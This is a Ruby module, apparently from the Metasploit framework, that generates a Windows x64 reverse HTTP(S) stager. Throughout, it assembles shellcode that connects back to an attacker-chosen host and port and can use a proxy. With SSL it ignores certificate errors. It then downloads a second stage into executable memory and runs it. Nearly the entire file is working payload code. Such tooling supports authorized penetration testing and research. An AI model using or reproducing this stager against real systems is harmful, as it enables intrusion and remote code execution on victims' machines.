# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/core/payload/windows/x64/block_api'
require 'msf/core/payload/windows/x64/exitfunk'
require 'msf/core/payload/uuid/options'

module Msf

###
#
# Complex payload generation for Windows ARCH_X86 that speak HTTP(S)
#
###

module Payload::Windows::ReverseHttp_x64

  include Msf::Payload::TransportConfig
  include Msf::Payload::Windows
  include Msf::Payload::Windows::BlockApi_x64
  include Msf::Payload::Windows::Exitfunk_x64
  include Msf::Payload::UUID::Options

  #
  # Register reverse_http specific options
  #
  def initialize(*args)
    super
    register_advanced_options(
      [ OptInt.new('StagerURILength', 'The URI length for the stager (at least 5 bytes)') ] +
      Msf::Opt::stager_retry_options +
      Msf::Opt::http_header_options +
      Msf::Opt::http_proxy_options
    )
  end

  def transport_config(opts={})
    transport_config_reverse_http(opts)
  end

  #
  # Generate the first stage
  #
  def generate(opts={})
    ds = opts[:datastore] || datastore

    conf = {
      ssl:         opts[:ssl] || false,
      host:        ds['LHOST'] || '127.127.127.127',
      port:        ds['LPORT'],
      retry_count: ds['StagerRetryCount'],
      retry_wait:  ds['StagerRetryWait']
    }

    # add extended options if we do have enough space
    if self.available_space.nil? || required_space <= self.available_space
      conf[:url]        = luri + generate_uri(opts)
      conf[:exitfunk]   = ds['EXITFUNC']
      conf[:ua]         = ds['HttpUserAgent']
      conf[:proxy_host] = ds['HttpProxyHost']
      conf[:proxy_port] = ds['HttpProxyPort']
      conf[:proxy_user] = ds['HttpProxyUser']
      conf[:proxy_pass] = ds['HttpProxyPass']
      conf[:proxy_type] = ds['HttpProxyType']
      conf[:custom_headers] = get_custom_headers(ds)
     else
      # Otherwise default to small URIs
      conf[:url]        = luri + generate_small_uri
    end

    generate_reverse_http(conf)
  end

  #
  # Generate the custom headers string
  #
  def get_custom_headers(ds)
    headers = ""
    headers << "Host: #{ds['HttpHostHeader']}\r\n" if ds['HttpHostHeader']
    headers << "Cookie: #{ds['HttpCookie']}\r\n" if ds['HttpCookie']
    headers << "Referer: #{ds['HttpReferer']}\r\n" if ds['HttpReferer']

    if headers.length > 0
      headers
    else
      nil
    end
  end

  #
  # Generate and compile the stager
  #
  def generate_reverse_http(opts={})
    combined_asm = %Q^
      cld                 ; Clear the direction flag.
      and rsp, ~0xf       ; Ensure RSP is 16 byte aligned
      call start          ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      start:
        pop rbp           ; rbp now contains the block API pointer
      #{asm_reverse_http(opts)}
    ^

    Metasm::Shellcode.assemble(Metasm::X64.new, combined_asm).encode_string
  end

  #
  # Generate the URI for the initial stager
  #
  def generate_uri(opts={})
    ds = opts[:datastore] || datastore
    uri_req_len = ds['StagerURILength'].to_i

    # Choose a random URI length between 30 and 255 bytes
    if uri_req_len == 0
      uri_req_len = 30 + luri.length + rand(256 - (30 + luri.length))
    end

    if uri_req_len < 5
      raise ArgumentError, "Minimum StagerURILength is 5"
    end

    generate_uri_uuid_mode(:init_native, uri_req_len)
  end

  #
  # Generate the URI for the initial stager
  #
  def generate_small_uri
    generate_uri_uuid_mode(:init_native, 5)
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    # Start with our cached default generated size
    space = cached_size

    # Add 100 bytes for the encoder to have some room
    space += 100

    # Make room for the maximum possible URL length
    space += 256

    # EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
    space += 31

    # Proxy options?
    space += 200

    # Custom headers? Ugh, impossible to tell
    space += 512

    # The final estimated size
    space
  end

  #
  # Convert a string into a NULL-terminated ASCII byte array
  #
  def asm_generate_ascii_array(str)
    (str.to_s + "\x00").
      unpack("C*").
      map{ |c| "0x%.2x" % c }.
      join(",")
  end

  #
  # Generate an assembly stub with the configured feature set and options.
  #
  # @option opts [Bool] :ssl Whether or not to enable SSL
  # @option opts [String] :url The URI to request during staging
  # @option opts [String] :host The host to connect to
  # @option opts [Integer] :port The port to connect to
  # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
  # @option opts [String] :proxy_host The optional proxy server host to use
  # @option opts [Integer] :proxy_port The optional proxy server port to use
  # @option opts [String] :proxy_type The optional proxy server type, one of HTTP or SOCKS
  # @option opts [String] :proxy_user The optional proxy server username
  # @option opts [String] :proxy_pass The optional proxy server password
  # @option opts [String] :custom_headers The optional collection of custom headers for the payload.
  # @option opts [Integer] :retry_count The number of times to retry a failed request before giving up
  # @option opts [Integer] :retry_wait The seconds to wait before retry a new request
  #
  def asm_reverse_http(opts={})

    retry_count   = opts[:retry_count].to_i
    retry_wait   = opts[:retry_wait].to_i * 1000
    proxy_enabled = !!(opts[:proxy_host].to_s.strip.length > 0)
    proxy_info    = ""

    if proxy_enabled
      if opts[:proxy_type].to_s.downcase == "socks"
        proxy_info << "socks="
      else
        proxy_info << "http://"
      end

      proxy_info << opts[:proxy_host].to_s
      if opts[:proxy_port].to_i > 0
        proxy_info << ":#{opts[:proxy_port]}"
      end
    end

    proxy_user = opts[:proxy_user].to_s.length == 0 ? nil : opts[:proxy_user]
    proxy_pass = opts[:proxy_pass].to_s.length == 0 ? nil : opts[:proxy_pass]

    custom_headers = opts[:custom_headers].to_s.length == 0 ? nil : asm_generate_ascii_array(opts[:custom_headers])

    http_open_flags = 0
    set_option_flags = 0

    if opts[:ssl]
      http_open_flags = (
        0x80000000 | # INTERNET_FLAG_RELOAD
        0x04000000 | # INTERNET_NO_CACHE_WRITE
        0x00800000 | # INTERNET_FLAG_SECURE
        0x00200000 | # INTERNET_FLAG_NO_AUTO_REDIRECT
        0x00001000 | # INTERNET_FLAG_IGNORE_CERT_CN_INVALID
        0x00002000 | # INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
        0x00000200 ) # INTERNET_FLAG_NO_UI

      set_option_flags = (
        0x00002000 | # SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
        0x00001000 | # SECURITY_FLAG_IGNORE_CERT_CN_INVALID
        0x00000200 | # SECURITY_FLAG_IGNORE_WRONG_USAGE
        0x00000100 | # SECURITY_FLAG_IGNORE_UNKNOWN_CA
        0x00000080 ) # SECURITY_FLAG_IGNORE_REVOCATION
    else
      http_open_flags = (
        0x80000000 | # INTERNET_FLAG_RELOAD
        0x04000000 | # INTERNET_NO_CACHE_WRITE
        0x00200000 | # INTERNET_FLAG_NO_AUTO_REDIRECT
        0x00000200 ) # INTERNET_FLAG_NO_UI
    end

    asm = %Q^
        xor rbx, rbx
      load_wininet:
        push rbx                      ; stack alignment
        mov r14, 'wininet'
        push r14                      ; Push 'wininet',0 onto the stack
        mov rcx, rsp                  ; lpFileName (stackpointer)
        mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
        call rbp

      internetopen:
        push rbx                      ; stack alignment
        push rbx                      ; NULL pointer
        mov rcx, rsp                  ; lpszAgent ("")
    ^

    if proxy_enabled
      asm << %Q^
        push 3
        pop rdx                       ; dwAccessType (3=INTERNET_OPEN_TYPE_PROXY)
        call load_proxy_name
        db "#{proxy_info}",0x0        ; proxy information
      load_proxy_name:
        pop r8                        ; lpszProxyName (stack pointer)
      ^
    else
      asm << %Q^
        push rbx
        pop rdx                       ; dwAccessType (0=INTERNET_OPEN_TYPE_PRECONFIG)
        xor r8, r8                    ; lpszProxyName (NULL)
      ^
    end

    asm << %Q^
        xor r9, r9                    ; lpszProxyBypass (NULL)
        push rbx                      ; stack alignment
        push rbx                      ; dwFlags (0)
        mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'InternetOpenA')}
        call rbp

        call load_server_host
        db "#{opts[:host]}",0x0
      load_server_host:
        pop rdx                       ; lpszServerName
        mov rcx, rax                  ; hInternet
        mov r8, #{opts[:port]}        ; nServerPort
        xor r9, r9                    ; lpszUsername (NULL)
        push rbx                      ; dwContent (0)
        push rbx                      ; dwFlags (0)
        push 3                        ; dwService (3=INTERNET_SERVICE_HTTP)
        push rbx                      ; lpszPassword (NULL)
        mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'InternetConnectA')}
        call rbp
    ^

    if proxy_enabled && (proxy_user || proxy_pass)
      asm << %Q^
        mov rsi, rax                  ; Store hConnection in rsi
      ^

      if proxy_user
        asm << %Q^
        call load_proxy_user          ; puts proxy_user pointer on stack
        db "#{proxy_user}", 0x00
      load_proxy_user:
        pop r8                        ; lpBuffer (stack pointer)
        mov rcx, rsi                  ; hConnection (connection handle)
        push 43                       ; (43=INTERNET_OPTION_PROXY_USERNAME)
        pop rdx
        push #{proxy_user.length}     ; dwBufferLength (proxy_user length)
        pop r9
        mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'InternetSetOptionA')}
        call rbp
        ^
      end

      if proxy_pass
        asm << %Q^
        call load_proxy_pass          ; puts proxy_pass pointer on stack
        db "#{proxy_pass}", 0x00
      load_proxy_pass:
        pop r8                        ; lpBuffer (stack pointer)
        mov rcx, rsi                  ; hConnection (connection handle)
        push 44                       ; (43=INTERNET_OPTION_PROXY_PASSWORD)
        pop rdx
        push #{proxy_pass.length}     ; dwBufferLength (proxy_pass length)
        pop r9
        mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'InternetSetOptionA')}
        call rbp
        ^
      end

      asm << %Q^
        mov rax, rsi                  ; Restore hConnection in rax
      ^
    end

    asm << %Q^
        call httpopenrequest
        db "#{opts[:url]}",0x0
      httpopenrequest:
        mov rcx, rax                  ; hConnect
        push rbx
        pop rdx                       ; lpszVerb (NULL=GET)
        pop r8                        ; lpszObjectName (URI)
        xor r9, r9                    ; lpszVersion (NULL)
        push rbx                      ; dwContext (0)
        mov rax, #{"0x%.8x" % http_open_flags}  ; dwFlags
        push rax
        push rbx                      ; lplpszAcceptType (NULL)
        push rbx                      ; lpszReferer (NULL)
        mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'HttpOpenRequestA')}
        call rbp

      prepare:
        mov rsi, rax
    ^

    if retry_count > 0
      asm << %Q^
        push #{retry_count}
        pop rdi
      ^
    end

    asm << %Q^
      retryrequest:
    ^

    if opts[:ssl]
      asm << %Q^
      internetsetoption:
        mov rcx, rsi                  ; hInternet (request handle)
        push 31
        pop rdx                       ; dwOption (31=INTERNET_OPTION_SECURITY_FLAG)
        push rdx                      ; stack alignment
        push #{"0x%.8x" % set_option_flags}  ; flags
        mov r8, rsp                   ; lpBuffer (pointer to flags)
        push 4
        pop r9                        ; dwBufferLength (4 = size of flags)
        mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'InternetSetOptionA')}
        call rbp

        xor r8, r8                    ; dwHeadersLen (0)
      ^
    end

    if custom_headers
      asm << %Q^
        call get_req_headers          ; lpszHeaders (pointer to the custom headers)
        db #{custom_headers}
      get_req_headers:
        pop rdx                       ; lpszHeaders
        dec r8                        ; dwHeadersLength (assume NULL terminated)
      ^
    else
      asm << %Q^
        push rbx
        pop rdx                       ; lpszHeaders (NULL)
      ^
    end


    asm << %Q^
        mov rcx, rsi                  ; hRequest (request handle)
        xor r9, r9                    ; lpszVersion (NULL)
        xor r9, r9                    ; lpszVersion (NULL)
        push rbx                      ; stack alignment
        push rbx                      ; dwOptionalLength (0)
        mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'HttpSendRequestA')}
        call rbp
        test eax, eax
        jnz allocate_memory

      set_wait:
        mov rcx, #{retry_wait}        ; dwMilliseconds
        mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'Sleep')}
        call rbp                      ; Sleep( dwMilliseconds );
    ^


    if retry_count > 0
      asm << %Q^
      try_it_again:
        dec rdi
        jz failure
        jmp retryrequest
      ^
    else
      asm << %Q^
        jmp retryrequest
        ; retry forever
      ^
    end

    if opts[:exitfunk]
      asm << %Q^
      failure:
        call exitfunk
      ^
    else
      asm << %Q^
      failure:
        ; hard-coded to ExitProcess(whatever) for size
        mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'ExitProcess')}
        call rbp              ; ExitProcess(whatever)
      ^
    end

    asm << %Q^
      allocate_memory:
        push rbx
        pop rcx                       ; lpAddress (NULL)
        push 0x40
        pop rdx
        mov r9, rdx                   ; flProtect (0x40=PAGE_EXECUTE_READWRITE)
        shl edx, 16                   ; dwSize
        mov r8, 0x1000                ; flAllocationType (0x1000=MEM_COMMIT)
        mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
        call rbp

      download_prep:
        xchg rax, rbx                 ; store the allocated base in rbx
        push rbx                      ; store a copy for later
        push rbx                      ; temp storage for byte count
        mov rdi, rsp                  ; rdi is the &bytesRead

      download_more:
        mov rcx, rsi                  ; hFile (request handle)
        mov rdx, rbx                  ; lpBuffer (pointer to mem)
        mov r8, 8192                  ; dwNumberOfBytesToRead (8k)
        mov r9, rdi                   ; lpdwNumberOfByteRead (stack pointer)
        mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'InternetReadFile')}
        call rbp
        add rsp, 32                   ; clean up reserved space

        test eax, eax                 ; did the download fail?
        jz failure

        mov ax, word ptr [rdi]        ; extract the read byte count
        add rbx, rax                  ; buffer += bytes read

        test eax, eax                 ; are we done?
        jnz download_more             ; keep going
        pop rax                       ; clear up reserved space

      execute_stage:
        ret                           ; return to the stored stage address
    ^

    if opts[:exitfunk]
      asm << asm_exitfunk(opts)
    end

    asm
  end

  #
  # Do not transmit the stage over the connection.  We handle this via HTTPS
  #
  def stage_over_connection?
    false
  end

  #
  # Always wait at least 20 seconds for this payload (due to staging delays)
  #
  def wfs_delay
    20
  end

end

end


